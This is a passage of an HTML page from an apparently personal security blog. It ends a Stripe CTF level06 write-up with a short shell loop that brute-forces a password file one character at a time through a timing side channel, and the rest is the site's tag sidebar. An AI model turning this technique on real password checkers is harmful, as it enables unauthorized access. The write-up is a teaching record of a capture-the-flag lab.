+<div class="highlight"><pre><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">level06</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">the</span><span class="o">-</span><span class="n">flag</span><span class="o">/</span><span class="p">.</span><span class="n">password</span> <span class="n">banana</span>
+ <span class="n">Welcome</span> <span class="n">to</span> <span class="n">the</span> <span class="n">password</span> <span class="n">checker</span><span class="o">!</span>
+<span class="err">$</span> <span class="n">Ha</span> <span class="n">ha</span><span class="p">,</span> <span class="n">your</span> <span class="n">password</span> <span class="n">is</span> <span class="n">incorrect</span><span class="o">!</span>
+</pre></div>
+
+
+<p>If this was a simple a case of <a href="http://en.wikipedia.org/wiki/Timing_attack">Timing Atack</a> we would be able to detect the output in <strong>stderr</strong> and in <strong>stdout</strong> to find the characters that form the password. But in this case there is a twist.</p>
+<p>For every input character, a loop is executed. A dot is printed after each character comparison. If the guess is wrong, the system forks a child process and runs a little slower (since each loop has complexity O(n^2) to guess size).  The maximum size of a guess is <strong>MAX_ARG_STRLEN</strong> which is around 0.1 MB. In other words, if <strong>stdout</strong> and *<em>stderr</em> can be blocked, the outputs can be timed to find the wring characters.</p>
+<p>A   possible shell exploit:</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
+2
+3
+4
+5</pre></div></td><td class="code"><div class="highlight"><pre><span class="k">for</span> <span class="n">c</span> <span class="n">in</span> <span class="p">{</span><span class="n">A</span><span class="p">..</span><span class="n">Z</span><span class="p">}</span> <span class="p">{</span><span class="n">a</span><span class="p">..</span><span class="n">z</span><span class="p">}</span> <span class="p">{</span><span class="mf">0..9</span><span class="p">};</span> <span class="k">do</span>
+<span class="n">echo</span> <span class="err">$</span><span class="n">c</span>
+<span class="n">head</span> <span class="o">-</span><span class="n">c35</span> <span class="n">file</span> <span class="o">&amp;</span> <span class="n">sleep</span> <span class="mf">0.1</span>
+<span class="o">/</span><span class="n">levels</span><span class="o">/</span><span class="n">level06</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">the</span><span class="o">-</span><span class="n">flag</span><span class="o">/</span><span class="p">.</span><span class="n">password</span> <span class="s">&quot;$c&quot;</span><span class="n">A</span> <span class="mi">2</span><span class="o">&gt;</span> <span class="n">file</span>
+<span class="n">done</span>
+</pre></div>
+</td></tr></table>
+
+<p>And we get our flag! This was fn!</p>
+<hr />
+<h2>References</h2>
+<ul>
+<li>
+<p><a href="https://stripe.com/blog/capture-the-flag-wrap-up">Andy Brody's Post</a></p>
+</li>
+<li>
+<p><a href="https://github.com/stripe-ctf">Stripe CTF Repository</a></p>
+</li>
+<li>
+<p>Pickle Modules is unsafe! <a href="https://blog.nelhage.com/2011/03/exploiting-pickle/">Here</a> and <a href="http://penturalabs.wordpress.com/2011/03/17/python-cpickle-allows-for-arbitrary-code-execution/">here</a>.</p>
+</li>
+</ul>
+                </div><!-- /.entry-content -->
+                <div class="comments">
+                <h2>Comments !</h2>
+                        <div id="disqus_thread"></div>
+                        <script type="text/javascript">
+                           var disqus_identifier = "the-first-stripe-ctf.html";
+                           (function() {
+                                var dsq = document.createElement('script');
+                                dsq.type = 'text/javascript'; dsq.async = true;
+                                dsq.src = 'http://bt3gl.disqus.com/embed.js';
+                                (document.getElementsByTagName('head')[0] ||
+                                 document.getElementsByTagName('body')[0]).appendChild(dsq);
+                          })();
+                        </script>
+                </div>
+        </article>
+</section>
+        </div><!--/span-->
+
+                <div class="span3 well sidebar-nav" id="sidebar">
+<ul class="nav nav-list">
+
+
+
+<li class="nav-header"><h4>Categories</h4></li>
+<li>
+<a href="http://bt3gl.github.io/category/web-security.html">
+    <i class="icon-folder-open icon-large"></i>Web Security
+</a>
+</li>
+<li>
+<a href="http://bt3gl.github.io/category/vulnerabilities.html">
+    <i class="icon-folder-open icon-large"></i>Vulnerabilities
+</a>
+</li>
+<li>
+<a href="http://bt3gl.github.io/category/reverse-engineering.html">
+    <i class="icon-folder-open icon-large"></i>Reverse Engineering
+</a>
+</li>
+<li>
+<a href="http://bt3gl.github.io/category/networking.html">
+    <i class="icon-folder-open icon-large"></i>Networking
+</a>
+</li>
+<li>
+<a href="http://bt3gl.github.io/category/lifeuniverseeverything.html">
+    <i class="icon-folder-open icon-large"></i>Life,Universe,Everything
+</a>
+</li>
+<li>
+<a href="http://bt3gl.github.io/category/forensics.html">
+    <i class="icon-folder-open icon-large"></i>Forensics
+</a>
+</li>
+<li>
+<a href="http://bt3gl.github.io/category/cryptography.html">
+    <i class="icon-folder-open icon-large"></i>Cryptography
+</a>
+</li>
+
+<br>
+
+<li class="nav-header"><h4>Tags</h4></li>
+<ul class="tagcloud">
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/chaosreader.html">
+        <i class="icon-tag icon-large"></i>Chaosreader
+    </a>
+</li>
+<li class="tag-1">
+    <a href="http://bt3gl.github.io/tag/csaw.html">
+        <i class="icon-tag icon-large"></i>CSAW
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/ftp.html">
+        <i class="icon-tag icon-large"></i>FTP
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/iwconfig.html">
+        <i class="icon-tag icon-large"></i>iwconfig
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/shellcode.html">
+        <i class="icon-tag icon-large"></i>shellcode
+    </a>
+</li>
+<li class="tag-2">
+    <a href="http://bt3gl.github.io/tag/javascript.html">
+        <i class="icon-tag icon-large"></i>JavaScript
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/unoconv.html">
+        <i class="icon-tag icon-large"></i>unoconv
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/arp.html">
+        <i class="icon-tag icon-large"></i>ARP
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/curl.html">
+        <i class="icon-tag icon-large"></i>curl
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/paillier.html">
+        <i class="icon-tag icon-large"></i>Paillier
+    </a>
+</li>
+<li class="tag-2">
+    <a href="http://bt3gl.github.io/tag/buffer_overflow.html">
+        <i class="icon-tag icon-large"></i>Buffer_overflow
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/command_injection.html">
+        <i class="icon-tag icon-large"></i>Command_Injection
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/jad.html">
+        <i class="icon-tag icon-large"></i>jad
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/timing_attack.html">
+        <i class="icon-tag icon-large"></i>Timing_attack
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/chrome.html">
+        <i class="icon-tag icon-large"></i>Chrome
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/burpsuite.html">
+        <i class="icon-tag icon-large"></i>BurpSuite
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/coldfusion.html">
+        <i class="icon-tag icon-large"></i>ColdFusion
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/love.html">
+        <i class="icon-tag icon-large"></i>Love
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/rips.html">
+        <i class="icon-tag icon-large"></i>RIPS
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/netsh.html">
+        <i class="icon-tag icon-large"></i>netsh
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/shellshock.html">
+        <i class="icon-tag icon-large"></i>Shellshock
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/telnet.html">
+        <i class="icon-tag icon-large"></i>telnet
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/stack_overflow-nop.html">
+        <i class="icon-tag icon-large"></i>Stack_Overflow NOP
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/mem.html">
+        <i class="icon-tag icon-large"></i>mem
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/bytecode.html">
+        <i class="icon-tag icon-large"></i>bytecode
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/pgp.html">
+        <i class="icon-tag icon-large"></i>PGP
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/csrf.html">
+        <i class="icon-tag icon-large"></i>CSRF
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/ltrace.html">
+        <i class="icon-tag icon-large"></i>ltrace
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/brute_force.html">
+        <i class="icon-tag icon-large"></i>Brute_Force
+    </a>
+</li>
+<li class="tag-1">
+    <a href="http://bt3gl.github.io/tag/ctf.html">
+        <i class="icon-tag icon-large"></i>CTF
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/crlsets.html">
+        <i class="icon-tag icon-large"></i>CRLSets
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/apphp.html">
+        <i class="icon-tag icon-large"></i>ApPHP
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/rot13.html">
+        <i class="icon-tag icon-large"></i>ROT13
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/ssh.html">
+        <i class="icon-tag icon-large"></i>ssh
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/assembly.html">
+        <i class="icon-tag icon-large"></i>assembly
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/crl.html">
+        <i class="icon-tag icon-large"></i>CRL
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/kismet.html">
+        <i class="icon-tag icon-large"></i>Kismet
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/tr.html">
+        <i class="icon-tag icon-large"></i>tr
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/xss.html">
+        <i class="icon-tag icon-large"></i>XSS
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/binary_search.html">
+        <i class="icon-tag icon-large"></i>Binary_Search
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/lfi.html">
+        <i class="icon-tag icon-large"></i>LFI
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/jit.html">
+        <i class="icon-tag icon-large"></i>JIT
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/exiftool.html">
+        <i class="icon-tag icon-large"></i>ExifTool
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/netcat.html">
+        <i class="icon-tag icon-large"></i>netcat
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/iframe.html">
+        <i class="icon-tag icon-large"></i>iframe
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/request.html">
+        <i class="icon-tag icon-large"></i>request
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/c.html">
+        <i class="icon-tag icon-large"></i>C
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/decimal.html">
+        <i class="icon-tag icon-large"></i>Decimal
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/arp_cache_poisining.html">
+        <i class="icon-tag icon-large"></i>ARP_Cache_Poisining
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/readelf.html">
+        <i class="icon-tag icon-large"></i>readelf
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/hashcat.html">
+        <i class="icon-tag icon-large"></i>hashcat
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/garbage_collection.html">
+        <i class="icon-tag icon-large"></i>garbage_collection
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/v8.html">
+        <i class="icon-tag icon-large"></i>V8
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/ocsp.html">
+        <i class="icon-tag icon-large"></i>OCSP
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/pygenere.html">
+        <i class="icon-tag icon-large"></i>pygenere
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/pdftotext.html">
+        <i class="icon-tag icon-large"></i>pdftotext
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/qpdf.html">
+        <i class="icon-tag icon-large"></i>qpdf
+    </a>
+</li>
+<li class="tag-2">
+    <a href="http://bt3gl.github.io/tag/wireshark.html">
+        <i class="icon-tag icon-large"></i>Wireshark
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/cache.html">
+        <i class="icon-tag icon-large"></i>cache
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/hope.html">
+        <i class="icon-tag icon-large"></i>Hope
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/tls.html">
+        <i class="icon-tag icon-large"></i>TLS
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/cms.html">
+        <i class="icon-tag icon-large"></i>CMS
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/oracle.html">
+        <i class="icon-tag icon-large"></i>Oracle
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/burp.html">
+        <i class="icon-tag icon-large"></i>Burp
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/steganography.html">
+        <i class="icon-tag icon-large"></i>Steganography
+    </a>
+</li>
+<li class="tag-1">
+    <a href="http://bt3gl.github.io/tag/python.html">
+        <i class="icon-tag icon-large"></i>Python
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/ifconfig.html">
+        <i class="icon-tag icon-large"></i>ifconfig
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/lamp.html">
+        <i class="icon-tag icon-large"></i>LAMP
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/unicode.html">
+        <i class="icon-tag icon-large"></i>Unicode
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/objdump.html">
+        <i class="icon-tag icon-large"></i>objdump
+    </a>
+</li>
+<li class="tag-2">
+    <a href="http://bt3gl.github.io/tag/php.html">
+        <i class="icon-tag icon-large"></i>PHP
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/stack_overflow.html">
+        <i class="icon-tag icon-large"></i>Stack_overflow
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/heartbleed.html">
+        <i class="icon-tag icon-large"></i>Heartbleed
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/rfi.html">
+        <i class="icon-tag icon-large"></i>RFI
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/cain__abel.html">
+        <i class="icon-tag icon-large"></i>Cain_&_Abel
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/gdb.html">
+        <i class="icon-tag icon-large"></i>gdb
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/nmap.html">
+        <i class="icon-tag icon-large"></i>Nmap
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/osi_model.html">
+        <i class="icon-tag icon-large"></i>OSI_Model
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/vigenere.html">
+        <i class="icon-tag icon-large"></i>Vigenere
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/pdf-parser.html">
+        <i class="icon-tag icon-large"></i>pdf-parser
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/uncompyle2.html">
+        <i class="icon-tag icon-large"></i>uncompyle2
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/mysql.html">
+        <i class="icon-tag icon-large"></i>MySQL
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/xor.html">
+        <i class="icon-tag icon-large"></i>XOR
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/base64.html">
+        <i class="icon-tag icon-large"></i>base64
+    </a>
+</li>
+<li class="tag-2">
+    <a href="http://bt3gl.github.io/tag/wargames.html">
+        <i class="icon-tag icon-large"></i>Wargames
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/socket.html">
+        <i class="icon-tag icon-large"></i>socket
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/gpg.html">
+        <i class="icon-tag icon-large"></i>GPG
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/outguess.html">
+        <i class="icon-tag icon-large"></i>OutGuess
+    </a>
+</li>
+<li class="tag-2">
+    <a href="http://bt3gl.github.io/tag/sqli.html">
+        <i class="icon-tag icon-large"></i>SQLi
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/bash.html">
+        <i class="icon-tag icon-large"></i>Bash
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/xssi.html">
+        <i class="icon-tag icon-large"></i>XSSI
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/sql_injection.html">
+        <i class="icon-tag icon-large"></i>SQL_injection
+    </a>
+</li>
+<li class="tag-2">
+    <a href="http://bt3gl.github.io/tag/linux.html">
+        <i class="icon-tag icon-large"></i>Linux
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/rce.html">
+        <i class="icon-tag icon-large"></i>RCE
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/scapy.html">
+        <i class="icon-tag icon-large"></i>scapy
+    </a>
+</li>
+
+
+</ul>
+
+        </div><!--/.well -->
+
+      </div><!--/row-->
+
+
+
+      <footer>
+        <address id="about">
+
+        </address><!-- /#about -->
+
+      </footer>
+
+    </div><!--/.fluid-container-->
+
+
+    <script src="http://bt3gl.github.io/theme/js/jquery-1.7.2.min.js"></script>
+    <script src="http://bt3gl.github.io/theme/js/bootstrap.min.js"></script>
+  </body>
+</html>
